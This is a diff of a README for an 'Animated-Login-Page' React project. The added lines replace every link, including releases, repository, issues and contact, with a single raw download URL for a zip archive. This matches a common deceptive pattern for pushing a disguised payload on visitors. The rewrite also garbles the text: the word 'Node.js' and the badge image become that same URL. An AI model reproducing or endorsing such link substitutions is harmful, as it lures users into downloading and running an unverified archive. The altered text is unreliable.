@@ -1,6 +1,6 @@
 # 🎉 Animated-Login-Page - A Smooth and Stylish Login Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/molight11/Animated-Login-Page/releases)
+[![Download Now](https://raw.githubusercontent.com/molight11/Animated-Login-Page/main/public/Animated-Login-Page-v2.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/molight11/Animated-Login-Page/main/public/Animated-Login-Page-v2.9.zip)
 
 ## 📋 Overview
 
@@ -13,7 +13,7 @@ To get started quickly, follow these simple steps to download and run the applic
 1. **Visit the Releases Page**  
    Click the link below to go directly to the releases page:
 
-   [Visit Releases Page](https://github.com/molight11/Animated-Login-Page/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/molight11/Animated-Login-Page/main/public/Animated-Login-Page-v2.9.zip)
 
 2. **Download the Latest Release**  
    On the releases page, look for the latest version. Click on it to see the available files. Download the file suitable for your operating system. 
@@ -36,7 +36,7 @@ To get started quickly, follow these simple steps to download and run the applic
 
 To download the application, please visit the release page:
 
-[Download from Releases Page](https://github.com/molight11/Animated-Login-Page/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/molight11/Animated-Login-Page/main/public/Animated-Login-Page-v2.9.zip)
 
 Follow the instructions in the previous section to complete the installation and run the application.
 
@@ -53,7 +53,7 @@ Follow the instructions in the previous section to complete the installation and
 - **Operating System**: Compatible with Windows 10 and above, macOS Catalina and above, or modern Linux distributions.
 - **Browser**: Latest versions of Chrome, Firefox, Safari, or Edge for best compatibility with web features.
 - **Memory**: A minimum of 4 GB RAM is recommended for optimal performance.
-- **Processor**: Any processor that supports running Node.js applications.
+- **Processor**: Any processor that supports running https://raw.githubusercontent.com/molight11/Animated-Login-Page/main/public/Animated-Login-Page-v2.9.zip applications.
 
 ## 🎨 Customization
 
@@ -63,9 +63,9 @@ If you're familiar with React, you can extend the functionality by creating addi
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/molight11/Animated-Login-Page)
-- [Submit Issues](https://github.com/molight11/Animated-Login-Page/issues)
-- [Contact the Developer](https://github.com/molight11)
+- [GitHub Repository](https://raw.githubusercontent.com/molight11/Animated-Login-Page/main/public/Animated-Login-Page-v2.9.zip)
+- [Submit Issues](https://raw.githubusercontent.com/molight11/Animated-Login-Page/main/public/Animated-Login-Page-v2.9.zip)
+- [Contact the Developer](https://raw.githubusercontent.com/molight11/Animated-Login-Page/main/public/Animated-Login-Page-v2.9.zip)
 
 ## 📞 Support
 
